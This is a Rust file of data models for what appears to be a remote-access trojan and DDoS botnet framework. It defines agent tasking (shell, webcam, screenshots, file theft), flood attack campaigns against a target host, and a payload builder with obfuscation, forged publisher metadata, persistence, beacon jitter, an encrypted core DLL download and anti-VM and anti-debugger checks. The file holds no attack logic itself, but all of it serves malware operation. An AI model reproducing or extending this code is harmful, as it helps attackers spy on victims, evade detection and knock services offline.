use serde::{Deserialize, Serialize};

// ── Enums ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum AgentStatus {
    Online,
    Offline,
    Sleeping,
    Compromised,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum TaskStatus {
    Pending,
    Sent,
    Running,
    Completed,
    Failed,
    Cancelled,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum UserRole {
    Operator,
    Admin,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum CommandType {
    Shell,
    PowerShell,
    LocalAccounts,
    Upload,
    Download,
    Screenshot,
    Webcam,
    WifiScan,
    Kill,
    Sleep,
    Proxy,
    FileList,
    FileDrives,
    StressHttpFlood,
    StressSynFlood,
    StressUdpFlood,
    StressIcmpFlood,
    StressReflection,
    StressSlowloris,
    StressTcpConnFlood,
    StressMalformed,
    StressStop,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum CampaignStatus {
    Running,
    Stopped,
    Completed,
    Failed,
}

// ── Task ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AgentTask {
    pub id: String,
    #[serde(default)]
    pub agent_id: String,
    #[serde(default)]
    pub created_by: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    pub status: TaskStatus,
    #[serde(default)]
    pub output: Option<String>,
    #[serde(default)]
    pub error: Option<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

fn default_timeout() -> i32 {
    60
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskCreateRequest {
    #[serde(default)]
    pub agent_id: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

impl AgentTask {
    pub fn new(id: String, agent_id: String, command_type: CommandType, command: String) -> Self {
        Self {
            id,
            agent_id,
            created_by: String::new(),
            command_type,
            command,
            arguments: Vec::new(),
            status: TaskStatus::Pending,
            output: None,
            error: None,
            timeout_seconds: 60,
        }
    }
}

// ── Hardware Info ──────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HardwareInfo {
    #[serde(default)]
    pub hwid: Option<String>,
    pub cpu: Option<CpuInfo>,
    #[serde(default)]
    pub gpus: Vec<GpuInfo>,
    #[serde(default)]
    pub disks: Vec<DiskInfo>,
    pub ram: Option<RamInfo>,
    #[serde(default)]
    pub displays: Vec<DisplayInfo>,
    #[serde(default)]
    pub motherboard_vendor: Option<String>,
    #[serde(default)]
    pub bios_version: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CpuInfo {
    #[serde(default)]
    pub name: String,
    pub physical_cores: usize,
    pub logical_cores: usize,
    pub max_clock_mhz: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GpuInfo {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub driver_version: Option<String>,
    pub vram_bytes: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiskInfo {
    #[serde(default)]
    pub model: String,
    pub size_bytes: u64,
    #[serde(default)]
    pub media_type: Option<String>,
    #[serde(default)]
    pub serial_number: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RamInfo {
    pub total_bytes: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DisplayInfo {
    #[serde(default)]
    pub name: String,
    pub width: u32,
    pub height: u32,
}

// ── Stress Config ──────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StressConfig {
    #[serde(default)]
    pub campaign_id: String,
    #[serde(default)]
    pub target_host: String,
    pub target_port: u16,
    #[serde(default)]
    pub methods: Vec<String>,
    pub duration_seconds: u64,
    #[serde(default = "default_threads")]
    pub threads_per_agent: u32,
    #[serde(default = "default_packet_size")]
    pub packet_size: usize,
    #[serde(default = "default_max_conns")]
    pub max_connections: usize,
    #[serde(default = "default_http_path")]
    pub http_path: String,
}

fn default_threads() -> u32 {
    100
}
fn default_packet_size() -> usize {
    1024
}
fn default_max_conns() -> usize {
    500
}
fn default_http_path() -> String {
    "/".into()
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct StressAgentStatus {
    pub campaign_id: String,
    pub agent_id: String,
    pub status: CampaignStatus,
    pub requests_sent: u64,
    pub bytes_sent: u64,
    pub errors: u64,
    pub timestamp: u64,
}

// ── Build Config ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BuildConfigRequest {
    #[serde(default = "default_platform")]
    pub platform: String,
    #[serde(default = "default_app_type")]
    pub application_type: String,
    #[serde(default = "default_host")]
    pub server_host: String,
    #[serde(default = "default_port")]
    pub server_port: u16,
    #[serde(default)]
    pub enable_obfuscation: bool,
    #[serde(default)]
    pub inject_junk_data: bool,
    #[serde(default = "default_junk_mb")]
    pub junk_data_mb: usize,
    #[serde(default)]
    pub icon_url: Option<String>,
    #[serde(default)]
    pub company_name: Option<String>,
    #[serde(default)]
    pub file_description: Option<String>,
    #[serde(default)]
    pub product_name: Option<String>,
    #[serde(default)]
    pub copyright: Option<String>,
    #[serde(default)]
    pub file_version: Option<String>,
    #[serde(default = "default_true")]
    pub trim_unused: bool,
    #[serde(default)]
    pub require_admin: bool,
    #[serde(default)]
    pub copy_to_app_data: bool,
    #[serde(default)]
    pub enable_persistence: bool,
    /// Language selector: "csharp" or "rust"
    #[serde(default = "default_lang")]
    pub language: String,
}

fn default_platform() -> String {
    "x64".into()
}
fn default_app_type() -> String {
    "Console".into()
}
fn default_host() -> String {
    "127.0.0.1".into()
}
fn default_port() -> u16 {
    5270
}
fn default_junk_mb() -> usize {
    10
}
fn default_true() -> bool {
    true
}
fn default_lang() -> String {
    "csharp".into()
}

// ── Config Injection (appended to binary at build time) ────────────────

/// Magic bytes that mark the start of the injected config block.
pub const CONFIG_MAGIC: &[u8; 16] = b"LIBRA_CFG_BLOCK!";

/// Anti-analysis detection configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiAnalysisConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_true")]
    pub check_cpu_cores: bool,
    #[serde(default = "default_true")]
    pub check_memory: bool,
    #[serde(default = "default_true")]
    pub check_uptime: bool,
    #[serde(default = "default_true")]
    pub check_debugger: bool,
    #[serde(default = "default_true")]
    pub check_parent_process: bool,
    #[serde(default = "default_true")]
    pub check_vm_mac: bool,
    #[serde(default = "default_true")]
    pub check_disk_size: bool,
    #[serde(default = "default_true")]
    pub check_username: bool,
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            check_cpu_cores: true,
            check_memory: true,
            check_uptime: true,
            check_debugger: true,
            check_parent_process: true,
            check_vm_mac: true,
            check_disk_size: true,
            check_username: true,
        }
    }
}

/// Config data injected into the binary at build time.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InjectedConfig {
    pub server_url: String,
    pub register_path: String,
    pub heartbeat_path: String,
    pub result_path: String,
    pub ws_path: String,
    pub heartbeat_interval_ms: u64,
    pub jitter_percent: f64,
    pub require_admin: bool,
    pub copy_to_path: Option<String>,
    pub enable_persistence: bool,
    /// Base64-encoded RSA-OAEP encrypted AES-256 key (for core DLL decryption)
    #[serde(default)]
    pub encrypted_aes_key: String,
    /// Server path to download the encrypted core DLL, e.g. "/api/beacon/core/{buildId}"
    #[serde(default)]
    pub core_download_path: String,
    /// Base64-encoded PKCS#8 DER RSA private key (for decrypting the AES key)
    #[serde(default)]
    pub rsa_private_key: String,
    /// Anti-analysis configuration
    #[serde(default)]
    pub anti_analysis: AntiAnalysisConfig,
}
